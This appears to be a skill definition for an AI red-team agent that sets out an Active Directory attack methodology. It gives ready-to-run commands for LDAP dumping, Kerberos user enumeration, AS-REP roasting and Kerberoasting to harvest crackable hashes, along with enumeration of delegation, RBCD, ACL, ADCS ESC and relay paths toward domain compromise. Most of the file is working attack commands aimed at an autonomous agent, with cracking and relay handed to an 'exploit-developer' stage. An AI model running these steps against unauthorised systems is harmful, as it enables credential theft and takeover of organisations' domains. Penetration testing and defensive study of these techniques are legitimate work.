---
name: ldap-kerberos
description: Enumerate LDAP directories and abuse Kerberos (anonymous bind, AS-REP roasting, Kerberoasting, delegation)
origin: RedteamOpencode
---

# LDAP / Kerberos

## When to Activate

- Ports 389/636 (LDAP/LDAPS), 88 (Kerberos), 464 (kpasswd), 3268/3269 (Global Catalog)
- Domain controller / AD lab

## Tools

`run_tool nmap`, `ldapsearch`, `ldapdomaindump`, `kerbrute`, `impacket` (`GetNPUsers.py`,
`GetUserSPNs.py`), `nxc ldap`, Metasploit (exploit phase).

## Methodology

### 1. LDAP Anonymous Bind
```bash
run_tool ldapsearch -x -H ldap://HOST -s base namingcontexts
run_tool ldapsearch -x -H ldap://HOST -b 'DC=example,DC=com' '(objectClass=user)'
run_tool nmap -p 389 --script ldap-rootdse,ldap-search HOST
```
Anonymous/authenticated bind → dump users, groups, computers, GPOs:
```bash
run_tool ldapdomaindump -u 'DOMAIN\user' -p PASS HOST -o $DIR/scans/ldapdump
nxc ldap HOST -u USER -p PASS --users --groups --computers --pass-pol
```

### 2. Kerberos User Enumeration
```bash
run_tool kerbrute userenum -d DOMAIN --dc HOST users.txt
```
Valid usernames (no lockout) feed credential attacks.

### 3. AS-REP Roasting (no pre-auth accounts)
```bash
run_tool GetNPUsers.py DOMAIN/ -dc-ip HOST -usersfile users.txt -format hashcat -outputfile $DIR/scans/asrep.txt
```

### 4. Kerberoasting (SPN accounts)
```bash
run_tool GetUserSPNs.py DOMAIN/USER:PASS -dc-ip HOST -request -outputfile $DIR/scans/kerberoast.txt
```

### 4b. AS-REP Roasting Edge Cases & Targeted Refinement
- **Unauthenticated discovery without a curated user list**: `GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt` returns `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` for invalid names vs an AS-REP hash for roastable ones — use the response to prune `users.txt` down to confirmed-valid accounts before any further Kerberos/LDAP work, not just for roasting.
- **Pre-filter via LDAP before hitting the KDC**: query `userAccountControl` for the `DONT_REQ_PREAUTH` bit directly — `ldapsearch -x -H ldap://HOST -b 'DC=example,DC=com' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName` — when an authenticated LDAP bind is already available, this is quieter and more precise than a KDC-facing sweep against the full user list.
- **Combined authenticated sweep**: once bound, `GetNPUsers.py DOMAIN/USER:PASS -request -format hashcat` roasts every `DONT_REQ_PREAUTH` account discovered via the LDAP filter in one pass instead of guessing usernames.
- Hand roasted `$krb5asrep$`/`$krb5tgs$` hashes to `credential-attacks` for offline cracking; do not crack here.

### 5. Delegation / ACL / ADCS
- **Unconstrained delegation**: `nxc ldap HOST -u USER -p PASS --trusted-for-delegation` — a compromised unconstrained-delegation host lets exploit-developer harvest TGTs from any user who authenticates to it.
- **Constrained delegation (S4U2Self/S4U2Proxy)**: check `msDS-AllowedToDelegateTo` via `ldapsearch -x -H ldap://HOST -b 'DC=...' '(msDS-AllowedToDelegateTo=*)'`; abuse requires a keytab/hash for the delegating account, hand to exploit-developer.
- **RBCD (Resource-Based Constrained Delegation)**: check for `msDS-AllowedToActOnBehalfOfOtherIdentity` write rights on computer objects — `bloodhound-python` or `dacledit.py` (impacket) to enumerate write-access edges; a writable RBCD attribute plus a controlled machine account is a full compromise chain.
  - Confirm the write edge concretely: `dacledit.py -action read -target 'TARGET_COMPUTER$' 'DOMAIN/USER:PASS'` — look for `GenericAll`/`GenericWrite` held by the compromised principal on the target computer object.
  - Check whether the compromised principal can mint its own machine account to complete the chain: `ldapsearch -x -H ldap://HOST -b 'DC=example,DC=com' '(objectClass=domain)' ms-DS-MachineAccountQuota` — a nonzero quota (default 10) means `addcomputer.py` can create an attacker-controlled computer object without any existing foothold, which is the RBCD prerequisite on an otherwise low-privilege account.
  - Report the write-edge + quota state together; S4U2Self/S4U2Proxy ticket forging is exploit-developer's to run.
- **ACL abuse via BloodHound**: `bloodhound-python -u USER -p PASS -ns HOST -d DOMAIN -c All` then ingest into BloodHound CE; flag `GenericAll`, `GenericWrite`, `WriteOwner`, `WriteDacl`, `AddMember`, `ForceChangePassword` edges from any compromised principal toward higher-privilege objects — report the shortest path to Domain Admins, do not execute the abuse chain here.
- **ADCS enumeration**: `certipy-ad find -u 'USER@DOMAIN' -p PASS -dc-ip HOST -vulnerable` to enumerate templates and flag vulnerable ESC paths directly:
  - **ESC1** — template allows requester-supplied SAN + client auth EKU + low enrollment rights
  - **ESC2/ESC3** — "Any Purpose" or certificate-request-agent EKU templates
  - **ESC4** — vulnerable template ACL (enrollee has write access to the template object)
  - **ESC6** — CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set (SAN injection at the CA level)
  - **ESC8** — NTLM relay to the CA's HTTP enrollment endpoint (`certsrv`); pairs with the SMB skill's coercion-candidate notes
  - Report the exact vulnerable template name + CA host; certificate-based domain-escalation (`certipy-ad req`/`auth`) is exploit-developer's to run.
- **Trust relationships**: `nxc ldap HOST -u USER -p PASS --trusted-domains` — cross-forest/cross-domain trusts widen the attack surface; note SID history and trust direction for exploit-developer.
- **GPP/cpassword**: check `SYSVOL` for `Groups.xml`/`Services.xml` containing legacy `cpassword` (AES-decryptable with a known Microsoft key) — `nxc smb HOST -u USER -p PASS -M gpp_password`.

### 5b. LDAP Signing & Channel Binding (relay prerequisite, confirm only)
- [ ] LDAP signing requirement on DCs — the LDAP-side analog to SMB signing-disabled relay: `nxc ldap HOST -u USER -p PASS -M ldap-signing` or `nmap --script ldap-search -p 389 HOST`; a DC that does not require signing on cleartext LDAP (389) is a relay target.
- [ ] LDAPS channel binding enforcement (post CVE-2017-8563 / 2020 hardening advisories): `ldapsearch -H ldaps://HOST -x -ZZ -b '' -s base` — confirm whether the server still completes a simple bind without a channel-binding token; an unenforced channel binding on LDAPS is what makes `ntlmrelayx`-to-LDAPS (and the ESC8 chain) viable even when LDAP signing alone is enforced on 389.
- [ ] Report both signing and channel-binding state together as one relay-prerequisite finding — they are independently configurable and both must be enforced to close the relay path.

Save every hash/ticket to `$DIR/scans/` and `$DIR/auth.json`; record usernames in `intel.md`.

## References

`references/active-directory/ad-enumeration.md`, `references/active-directory/kerberos-attacks.md`,
`references/active-directory/adcs-attacks.md`, `references/active-directory/ad-persistence.md`.

## Confirm-Only Rule

Roasting/enumeration is confirm-stage. Cracking, relay, and lateral movement are owned by
`exploit-developer` (stage=vuln_confirmed). Report hashes + next action, do not brute force here.
